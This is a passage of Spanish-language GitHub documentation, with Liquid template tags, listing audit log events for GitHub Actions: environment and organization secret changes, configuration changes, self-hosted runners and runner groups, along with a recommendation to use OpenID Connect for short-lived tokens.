Si estás utilizando las {% data variables.product.prodname_actions %} para desplegar a un proveedor en la nube o si intentas utilizar HashiCorp Vault para la administración de secretos, entonces se recomienda que consideres utilizar OpenID Connect para crear tokens de acceso con un buen alcance y de vida corta para tus ejecuciones de flujo de trabajo. Para más información, vea "[Acerca del fortalecimiento de la seguridad con OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)".

{% endif %}

## Auditar eventos de {% data variables.product.prodname_actions %}

Puedes utilizar la bitácora de auditoría para monitorear las tareas administrativas en una organización. El registro de auditoría registra el tipo de acción, cuándo se ejecutó, y qué cuenta personal llevó a cabo la acción.

Por ejemplo, puede usar el registro de auditoría para realizar un seguimiento del evento `org.update_actions_secret`, que realiza un seguimiento de los cambios en los secretos de la organización: ![Entradas del registro de auditoría](/assets/images/help/repository/audit-log-entries.png)

Las siguientes tablas describen los eventos de {% data variables.product.prodname_actions %} que puedes encontrar en la bitácora de auditoría. Para obtener más información sobre el uso del registro de auditoría, vea "[Revisión del registro de auditoría de su organización](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" y "[Revisión de los registros de auditoría de su empresa](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)".

{% ifversion fpt or ghec %}
### Eventos para los ambientes

| Acción | Descripción
|------------------|-------------------
| `environment.create_actions_secret` | Se activa cuando se crea un secreto en un ambiente. Para más información, vea "[Secretos de entorno](/actions/reference/environments#environment-secrets)".
| `environment.delete` | Se activa cuando se borra un ambiente. Para más información, vea "[Eliminación de un entorno](/actions/reference/environments#deleting-an-environment)".
| `environment.remove_actions_secret` |  Se activa cuando se elimina a un secreto de un ambiente. Para más información, vea "[Secretos de entorno](/actions/reference/environments#environment-secrets)".
| `environment.update_actions_secret` | Se activa cuando se actualiza a un secreto en un ambiente. Para más información, vea "[Secretos de entorno](/actions/reference/environments#environment-secrets)".
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Eventos para cambios de configuración
| Acción | Descripción
|------------------|-------------------
| `repo.actions_enabled` | Se activa cuando {% data variables.product.prodname_actions %} se habilita en un repositorio. Puede visualizarse utilizando la IU. Este evento no es visible cuando accedes a la bitácora de auditoría utilizando la API de REST. Para más información, vea "[Uso de la API REST](#using-the-rest-api)".
| `repo.update_actions_access_settings` | Se desencadena cuando cambia la configuración para controlar cómo usan el repositorio flujos de trabajo de {% data variables.product.prodname_actions %} en otros repositorios.
{% endif %}

### Eventos para la administración de secretos
| Acción | Descripción
|------------------|-------------------
| `org.create_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se crea para una organización. Para más información, vea "[Creación de secretos cifrados para una organización](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)".
| `org.remove_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se elimina.
| `org.update_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se actualiza.
| `repo.create_actions_secret ` | Se crea cuando un secreto de {% data variables.product.prodname_actions %} se crea para un repositorio. Para más información, vea "[Creación de secretos cifrados para un repositorio](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)".
| `repo.remove_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se elimina.
| `repo.update_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se actualiza.

### Eventos para ejecutores auto-hospedados
| Acción | Descripción
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | Se crea cuando se registra un ejecutor auto-hospedado nuevo. Para más información, vea "[Incorporación de un ejecutor autohospedado a una empresa](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)".
| `enterprise.remove_self_hosted_runner` | Se activa cuando se elimina un ejecutor auto-hospedado.
| `enterprise.runner_group_runners_updated` | Se activa cuando la lista de miembros de un grupo de ejecutores se actualiza. Para más información, vea "[Establecimiento de los ejecutores autohospedados en un grupo para una organización](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".
| `enterprise.self_hosted_runner_online` | Se activa cuando la aplicación del ejecutor se inicia. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para más información, vea "[Comprobación del estado de un ejecutor autohospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `enterprise.self_hosted_runner_offline` | Se activa cuando se detiene la aplicación del ejecutor. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para más información, vea "[Comprobación del estado de un ejecutor autohospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `enterprise.self_hosted_runner_updated` | Se activa cuando se actualiza la aplicación ejecutora. Puede visualizarse utilizando la API de REST y la IU. Este evento no se incluye cuando exportas la bitácora de auditoría como datos de JSON o como un archivo de CSV. Para obtener más información, vea "[Acerca de los ejecutores autohospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" y "[Revisión del registro de auditoría de su organización](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)".
| `org.register_self_hosted_runner` | Se crea cuando se registra un ejecutor auto-hospedado nuevo. Para más información, vea "[Adición de un ejecutor autohospedado a una organización](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)".
| `org.remove_self_hosted_runner` | Se activa cuando se elimina un ejecutor auto-hospedado. Para más información, vea [Eliminación de un ejecutor de una organización](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).
| `org.runner_group_runners_updated` | Se activa cuando se actualiza la lista de miembros de un grupo de ejecutores. Para más información, vea "[Establecimiento de los ejecutores autohospedados en un grupo para una organización](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".
| `org.runner_group_updated` | Se activa cuando se cambia la configuración de un grupo de ejecutores auto-hospedados. Para más información, vea "[Cambio de la directiva de acceso de un grupo de ejecutores autohospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".
| `org.self_hosted_runner_online` | Se activa cuando la aplicación del ejecutor se inicia. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para más información, vea "[Comprobación del estado de un ejecutor autohospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `org.self_hosted_runner_offline` | Se activa cuando se detiene la aplicación del ejecutor. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para más información, vea "[Comprobación del estado de un ejecutor autohospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `org.self_hosted_runner_updated` | Se activa cuando se actualiza la aplicación ejecutora. Se puede ver utilizando la API de REST y la IU; no se puede ver en la exportación de JSON/CSV. Para más información, consulte [Seguridad del ejecutor autohospedado con repositorios públicos](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners).
| `repo.register_self_hosted_runner` | Se crea cuando se registra un ejecutor auto-hospedado nuevo. Para más información, vea "[Adición de un ejecutor autohospedado a un repositorio](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)".
| `repo.remove_self_hosted_runner` | Se activa cuando se elimina un ejecutor auto-hospedado. Para obtener más información, consulta "[Eliminación de un ejecutor de un repositorio](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)".
| `repo.self_hosted_runner_online` | Se activa cuando la aplicación del ejecutor se inicia. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para más información, vea "[Comprobación del estado de un ejecutor autohospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `repo.self_hosted_runner_offline` | Se activa cuando se detiene la aplicación del ejecutor. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para más información, vea "[Comprobación del estado de un ejecutor autohospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `repo.self_hosted_runner_updated` | Se activa cuando se actualiza la aplicación ejecutora. Se puede ver utilizando la API de REST y la IU; no se puede ver en la exportación de JSON/CSV. Para más información, consulte [Seguridad del ejecutor autohospedado con repositorios públicos](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners).

### Eventos para grupos de ejecutores auto-hospedados
| Acción | Descripción
|------------------|-------------------
| `enterprise.runner_group_created` | Se activa cuando se crea un grupo de ejecutores auto-hospedados. Para más información, vea "[Creación de un grupo de ejecutores autohospedados para una empresa](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)".
| `enterprise.runner_group_removed` | Se activa cuando se elimina un grupo de ejecutores auto-hospedado. Para más información, vea "[Eliminación de un grupo de ejecutores autohospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".
| `enterprise.runner_group_runner_removed` | Se activa cuando se utiliza la API de REST para eliminar un ejecutor auto-hospedado de un grupo.
| `enterprise.runner_group_runners_added` | Se activa cuando se agrega un ejecutor auto-hospedado a un grupo. Para más información, vea "[Traslado de un ejecutor autohospedado a un grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".
| `enterprise.runner_group_updated` |Se activa cuando se cambia la configuración de un grupo de ejecutores auto-hospedados. Para más información, vea "[Cambio de la directiva de acceso de un grupo de ejecutores autohospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".
| `org.runner_group_created` | Se activa cuando se crea un grupo de ejecutores auto-hospedados. Para más información, vea "[Creación de un grupo de ejecutores autohospedados para una organización](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)".
| `org.runner_group_removed` | Se activa cuando se elimina un grupo de ejecutores auto-hospedado. Para más información, vea "[Eliminación de un grupo de ejecutores autohospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".
| `org.runner_group_updated` | Se activa cuando se cambia la configuración de un grupo de ejecutores auto-hospedados. Para más información, vea "[Cambio de la directiva de acceso de un grupo de ejecutores autohospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".
| `org.runner_group_runners_added` | Se activa cuando se agrega un ejecutor auto-hospedado a un grupo. Para más información, vea "[Traslado de un ejecutor autohospedado a un grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".
| `org.runner_group_runner_removed` | Se activa cuando se utiliza la API de REST para eliminar un ejecutor auto-hospedado de un grupo. Para más información, vea "[Eliminación de un ejecutor autohospedado de un grupo en una organización](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)".

### Eventos para las actividades de los flujos de trabajo

{% data reusables.actions.actions-audit-events-workflow %}
